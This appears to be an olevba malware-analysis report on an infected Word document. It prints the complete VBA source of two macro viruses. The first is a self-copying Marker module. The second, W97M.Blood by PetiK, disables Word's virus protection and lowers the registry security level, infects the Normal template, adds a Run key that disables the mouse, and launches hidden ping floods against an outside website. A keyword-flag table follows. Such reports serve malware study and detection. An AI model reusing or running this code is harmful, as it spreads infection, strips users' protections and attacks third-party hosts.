olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.ke
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.ke - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
Const marker = "<-this is  a marker"
Dim savedocument, savenormaltemplate, dti, nti As Boolean
Dim ad, nt As Object
Dim ourcode As String
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
dti = ad.CodeModule.Find(marker, 1, 1, 10000, 10000)
nti = nt.CodeModule.Find(marker, 1, 1, 10000, 10000)
'If Day(Now()) = 29 Then
 ' Selection.TypeText "hello,you have been cracked!"
'End If
If dti = True Xor nti = True Then

If dti = True Then
  savenormaltemplate = NormalTemplate.Saved
  ourcode = ad.CodeModule.Lines(1, ad.CodeModule.countoflines)
  For Each Template In tempaltes
    Template.VBProject.VBComponents.Item(1).codemoudle.deletelines 1, ad.CodeModule.countoflines
    Template.VBProject.VBComponents.Item(1).CodeModule.AddFromString ourcode
     Template.VBProject.VBComponents.Item(1).Save
  Next Template
  
  nt.codemoudle.deletelines 1, ad.CodeModule.countoflines
  nt.CodeModule.AddFromString ourcode
  nt.Save
End If
If nti = True Then
  savedocument = ActiveDocument.Saved
  ourcode = nt.CodeModule.Lines(1, nt.CodeModule.countoflines)
  ad.codemoudle.deletelines 1, nt.CodeModule.countoflines
  ad.CodeModule.AddFromString ourcode
  nt.Save
End If
End If

End Sub

  

-------------------------------------------------------------------------------
VBA MACRO Blood.bas 
in file: Virus.MSWord.Marker.ke - OLE stream: 'Macros/VBA/Blood'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&

WordBasic.DisableAutoMacros 0
Set Nor = NormalTemplate.VBProject.VBComponents
Set Doc = ActiveDocument.VBProject.VBComponents
win = Environ("windir")
DropFile = win & "\blood.sys"
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Blood\", "InfectDot") <> "OK" Then
    Doc("Blood").Export DropFile
    Nor.import DropFile
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Blood\", "InfectDot") = "OK"
End If
If Doc.Item("Blood").Name <> "Blood" Then
    Nor("Blood").Export DropFile
    Doc.import DropFile
    ActiveDocument.Save
End If

If Day(Now) = 15 Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") = "BloodMan"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOrganization") = "PetiK Corporation"
End If

End Sub

Sub HelpAbout()
With Application.Assistant
    .Visible = True
End With
With Assistant.NewBalloon
    .Text = "W97M.Blood.A coded by PetiK (c)2001"
    .Heading = "W97M.Blood"
    .Animation = msoAnimationGetAttentionMajor
    .Button = msoButtonSetOK
    .Show
End With
End Sub

Sub ViewVBCode()
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\", "Blood1") = "rundll32 mouse,disable"
MsgBox "Your computer is dead." + vbCr + "Don't stop your machine", vbCritical, "W97M.Blood"
ShowVisualBasicEditor = True
End Sub

Sub AutoClose()
MsgBox "PetiK vous souhaite une trטs bonne journיe", vbExclamation, "W97M.Blood"
Call PetiK
Call Attak
End Sub

Sub PetiK()
On Error Resume Next
win = Environ("windir")
FileSystem.MkDir win & "\Blood"
Open win & "\Blood\TitleBlood.txt" For Output As #1
Print #1, "For the new Macro Virus W97M.Blood by PetiK"
Print #1, ""
Print #1, "Hi " & Application.UserName & ","
Print #1, "How do you do ?"
Print #1, "Your computer is infected by Blood"
Print #1, "It's not a dangerous macro."
Print #1, "         Bye.    PetiK"
Close #1
FileSystem.SetAttr win & "\Blood\TitleBlood.txt", vbReadOnly
End Sub

Sub Attak()
Shell "ping -l 5000 -t www.front-national.fr", vbHide
Shell "ping -l 5000 -t front-national.fr", vbHide
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

